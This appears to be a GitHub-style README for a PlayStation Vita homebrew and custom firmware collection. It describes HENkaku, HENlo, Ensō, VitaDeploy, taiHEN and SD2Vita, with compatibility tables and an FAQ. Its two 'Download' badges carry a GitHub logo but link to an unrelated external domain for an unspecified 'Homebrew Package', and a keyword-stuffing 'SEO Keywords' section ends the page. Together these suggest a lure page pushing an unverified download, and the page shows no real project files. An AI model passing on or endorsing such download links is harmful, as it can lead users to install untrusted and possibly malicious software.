
# PlayStation Vita Homebrew & Custom Firmware

<p align="center">
  <img src="https://img.shields.io/badge/Platform-PS%20Vita-006FCD?style=for-the-badge&logo=playstation" alt="PlayStation Vita"/>
  <img src="https://img.shields.io/badge/PS%20TV-Supported-003791?style=for-the-badge" alt="PlayStation TV"/>
  <img src="https://img.shields.io/badge/CFW-HENkaku%20%7C%20Ens%C5%8D-blue?style=for-the-badge" alt="HENkaku and Enso"/>
  <img src="https://img.shields.io/badge/Category-Homebrew-green?style=for-the-badge" alt="Homebrew"/>
</p>

<p align="center">
  <a href="https://dyhuiying.com/s/file"><img src="https://img.shields.io/badge/Download-PS%20Vita%20Resources-blue?style=for-the-badge&logo=github" alt="Download PS Vita Resources"/></a>
</p>

## Overview

PlayStation Vita Homebrew & Custom Firmware is a community-oriented collection of software, tools, plugins, and resources for the Sony PlayStation Vita and PlayStation TV.

The project covers the HENkaku homebrew environment, Ensō custom firmware, VitaDeploy, VitaShell, taiHEN plugins, storage expansion, emulation, and system customization.

The PS Vita homebrew ecosystem allows compatible applications to run with extended system permissions. Depending on the installed environment, users can manage files, install homebrew applications, customize the interface, use additional storage devices, run emulators, and access other community-developed features.

This repository is intended as a technical resource for PS Vita owners, homebrew users, and developers. It is not an official Sony product.

## Key Features

- **HENkaku:** Homebrew environment for compatible PS Vita and PS TV firmware.
- **HENlo:** Browser-based exploit chain used by current installation workflows on supported firmware.
- **Ensō CFW:** Boot-time custom firmware environment for compatible firmware configurations.
- **VitaDeploy:** Toolbox for homebrew setup, firmware installation, storage management, and application installation.
- **VitaShell:** File manager with USB and FTP transfer functionality.
- **taiHEN:** Plugin framework for system-level homebrew extensions.
- **Plugin Management:** Support for compatible system and application plugins.
- **SD2Vita:** Storage expansion using a compatible microSD card and game-card-slot adapter.
- **YAMT:** Storage management plugin for supported firmware configurations.
- **Adrenaline:** PSP environment for compatible PSP and PS1 software.
- **Emulation:** Support for compatible emulators and retro gaming applications.
- **System Customization:** Themes, interface modifications, save management, and other homebrew features.
- **Developer Tools:** Utilities for application development, debugging, and system analysis.

## Technical Specifications

| Component | PS Vita |
|---|---|
| Main Processor | ARM Cortex-A9 quad-core |
| GPU | SGX543MP4+ |
| RAM | 512 MB |
| Video Memory | 128 MB |
| Display Resolution | 960 × 544 |
| Display | OLED on PCH-1000; LCD on PCH-2000 |
| Storage | Proprietary memory card, internal storage on selected models, compatible SD2Vita configurations |
| Operating System | PlayStation Vita system software |
| Homebrew Framework | HENkaku / taiHEN |
| Persistent CFW | Ensō on supported firmware |

The PS Vita and PS TV share the same general homebrew software ecosystem, although hardware-specific features and peripherals may differ.

## Compatibility

### Supported Hardware

| Model | Description |
|---|---|
| PCH-1000 | Original PS Vita with OLED display |
| PCH-1100 | Original PS Vita with 3G connectivity |
| PCH-2000 | PS Vita Slim with LCD display |
| VTE-1000 | PlayStation TV / Vita TV |

### Firmware Compatibility

| Firmware | Homebrew / Exploit Support | Ensō |
|---|---|---|
| 3.60 | HENkaku | Supported |
| 3.65 | HENkaku / supported exploit workflows | Supported |
| 3.68 | HENlo-compatible workflow | Not supported as a native Ensō target |
| 3.74 | HENlo-compatible workflow | Requires a supported downgrade path |

HENlo supports firmware versions 3.65, 3.68, and 3.74. Ensō provides persistent boot-time CFW on supported firmware up to 3.65.

A console on newer firmware may be able to use a supported downgrade workflow, depending on its factory firmware limitations and hardware configuration.

Compatibility is determined by the individual tool, firmware version, console model, and installation method. Do not assume that every plugin or application works on every firmware version.

## Firmware Features

### HENkaku

HENkaku is the homebrew environment that enables compatible unsigned applications and extended system access.

Its capabilities include:

- Homebrew application installation.
- Extended permissions for compatible applications.
- taiHEN plugin framework integration.
- System customization.
- Access to additional development and management utilities.

HENkaku by itself is not necessarily persistent across reboots.

### HENlo

HENlo is a browser-based exploit chain used to bootstrap the homebrew environment on supported firmware.

It is compatible with firmware 3.65, 3.68, and 3.74. The initial exploit must be launched again after a reboot unless a persistent CFW solution is installed.

### Ensō

Ensō is a persistent custom firmware solution that loads the HENkaku environment during system startup.

Its primary advantage is that users do not need to manually launch the initial exploit after every reboot.

Ensō is supported on firmware 3.60 and 3.65. Newer firmware installations generally require a supported downgrade procedure before Ensō can be used.

### taiHEN

taiHEN is a framework for loading system and application plugins.

Plugins can provide additional functionality such as storage management, compatibility improvements, interface customization, and debugging tools.

Plugin compatibility depends on the firmware version and the specific plugin release.

## System Requirements

### Hardware

- Compatible Sony PS Vita or PlayStation TV.
- Sufficient storage space for applications and homebrew files.
- Official memory card or supported internal storage configuration where required.
- Compatible microSD card and SD2Vita adapter for optional storage expansion.
- USB cable or network connection for file transfers.

### Software

- Compatible PS Vita system software.
- HENkaku, HENlo, or another supported homebrew entry point.
- VitaDeploy for supported installation and management workflows.
- VitaShell for file management.
- Compatible taiHEN plugins where additional functionality is required.
- A computer for optional file transfers and application development.

Some tools require specific firmware versions or additional dependencies.

## Download & Installation

<p align="center">
  <a href="https://dyhuiying.com/s/file"><img src="https://img.shields.io/badge/Download-Homebrew%20Package-blue?style=for-the-badge&logo=github" alt="Download PS Vita Homebrew Package"/></a>
</p>

### General Installation Workflow

1. Identify the exact PS Vita or PS TV model.
2. Check the installed firmware in Settings → System → System Information.
3. Consult the current compatibility instructions for the intended homebrew environment.
4. Use the appropriate supported entry point for the installed firmware.
5. Install and configure the required homebrew management utilities.
6. Verify that the homebrew environment works before adding optional plugins.
7. Install applications from trusted project releases.
8. Back up important data before changing firmware or storage configuration.

### Main Homebrew Components

| Component | Purpose |
|---|---|
| HENlo | Browser-based exploit entry point |
| HENkaku | Homebrew environment |
| Ensō | Persistent CFW boot solution |
| VitaDeploy | Installation and system management toolbox |
| VitaShell | File manager and transfer utility |
| taiHEN | Plugin framework |
| YAMT | Storage management |
| Adrenaline | PSP environment |

### Important Installation Notes

- Follow a current model- and firmware-specific guide.
- Do not interrupt firmware installation or downgrade operations.
- Keep the console adequately charged during system modifications.
- Back up memory card contents and important saves.
- Do not install plugins without checking firmware compatibility.
- Avoid mixing multiple storage-management plugins that perform the same function.
- Never use firmware files intended for a different PlayStation device.

## Configuration & Management

### VitaDeploy

VitaDeploy is a toolbox for managing the PS Vita homebrew environment.

Depending on its version, it provides:

- Homebrew application installation.
- Firmware installation and downgrade utilities.
- Ensō installation options.
- taiHEN configuration.
- Storage formatting and management.
- SD2Vita configuration.
- Internal storage management utilities.
- Access to selected homebrew applications.

Available firmware installation options and presets depend on the VitaDeploy release.

### VitaShell

VitaShell provides file management and data transfer capabilities.

Common features include:

- Browsing system storage partitions.
- Copying and moving files.
- Installing compatible VPK packages.
- USB file transfer.
- FTP file transfer.
- Managing application and homebrew directories.

### SD2Vita

SD2Vita adapters use the PS Vita game-card slot to provide microSD-based storage on compatible configurations.

A typical setup involves:

1. A compatible SD2Vita adapter.
2. A suitable microSD card.
3. A compatible storage-management plugin.
4. Correct storage mount configuration.
5. A backup of existing data before changing storage assignments.

SD2Vita is not an official Sony accessory. Compatibility and performance depend on the adapter, microSD card, firmware, and storage plugin.

### Adrenaline

Adrenaline provides a PSP environment within the PS Vita homebrew ecosystem.

It can support compatible PSP software and PlayStation 1 content through the PSP software environment. Compatibility depends on the application, configuration, and source files.

### Plugin Management

taiHEN plugins are commonly configured through a tai configuration file.

When managing plugins:

- Verify the plugin's firmware requirements.
- Use the correct configuration section.
- Avoid duplicate or conflicting entries.
- Keep backups of working configuration files.
- Disable problematic plugins when troubleshooting startup issues.

## Troubleshooting

| Issue | Possible Cause | Recommended Action |
|---|---|---|
| Homebrew does not launch | Exploit environment is not active | Verify HENkaku or the selected entry point |
| Homebrew disappears after reboot | Non-persistent exploit environment | Relaunch the supported entry point or configure compatible Ensō |
| HENlo fails to start | Unsupported firmware or browser issue | Verify firmware compatibility and follow the current guide |
| Ensō installation unavailable | Unsupported firmware version | Check Ensō requirements and downgrade eligibility |
| VitaShell cannot access storage | Incorrect mount configuration | Review storage plugin settings |
| SD2Vita is not detected | Adapter, card, or plugin issue | Check hardware seating, formatting, and mount configuration |
| Plugins cause a boot problem | Conflicting or incompatible plugin | Disable the problematic plugin using a supported recovery method |
| VPK installation fails | Invalid package or insufficient storage | Verify the package and available space |
| FTP connection fails | Network or firewall configuration | Check the displayed IP address, port, and network |
| PSP software does not launch | Adrenaline configuration or compatibility issue | Review the Adrenaline setup and application requirements |
| System behaves unexpectedly | Modified system files or plugin conflict | Restore a known-good configuration or consult a recovery guide |

## FAQ

### 1. What is PS Vita homebrew?

PS Vita homebrew is independently developed software that runs on the PlayStation Vita or PlayStation TV using a compatible homebrew environment.

### 2. What is the difference between HENkaku and Ensō?

HENkaku provides the homebrew environment. Ensō is a persistent CFW solution that loads the HENkaku environment during system startup on supported firmware.

### 3. Can I install homebrew on firmware 3.74?

Yes. HENlo supports firmware 3.74 and can be used to bootstrap the homebrew environment. Ensō itself is not installed directly on 3.74; a supported downgrade path is required for persistent Ensō.

### 4. Does Ensō work on every PS Vita?

Ensō supports firmware 3.60 and 3.65. Hardware and factory firmware limitations can affect downgrade eligibility.

### 5. What is VitaDeploy?

VitaDeploy is a homebrew toolbox that simplifies application installation, firmware management, storage configuration, and other system utilities.

### 6. What is VitaShell used for?

VitaShell is a file manager that supports browsing storage, installing compatible VPK packages, and transferring files over USB or FTP.

### 7. Can I use a microSD card instead of a Sony memory card?

Yes, with a compatible SD2Vita adapter and storage-management configuration. Requirements differ between PS Vita models and firmware setups.

### 8. What is taiHEN?

taiHEN is a plugin framework that allows compatible system and application extensions to run in the PS Vita homebrew environment.

### 9. Can the PS Vita run PSP games?

Yes. Adrenaline provides a PSP environment on a compatible modified PS Vita, allowing supported PSP software and PS1 content to run.

### 10. Is PlayStation TV supported?

Yes. PlayStation TV shares the PS Vita software platform and supports many of the same homebrew tools, although hardware-specific differences may affect individual applications.

### 11. Will installing custom firmware delete my data?

Not necessarily, but firmware changes, storage reconfiguration, formatting, and installation errors can result in data loss. Always make a backup before modifying the system.

### 12. Is this project affiliated with Sony?

No. This is an independent community-oriented project and is not affiliated with, sponsored by, or endorsed by Sony Interactive Entertainment.

## SEO Keywords

PS Vita Homebrew, PlayStation Vita, PS Vita Custom Firmware, PS Vita CFW, HENkaku, HENlo, Ensō CFW, taiHEN, VitaDeploy, VitaShell, PS Vita Plugins, PS Vita Jailbreak, PS Vita Homebrew Apps, PS TV Homebrew, PlayStation TV, SD2Vita, YAMT, Adrenaline PSP, PS Vita Emulator, PS Vita Storage, PS Vita Firmware, PS Vita Downgrade, PS Vita System Tools, PS Vita File Manager, PS Vita Customization, PS Vita Development, PS Vita Utilities, PS Vita Plugin Manager, PS Vita Community, PlayStation Portable Compatibility
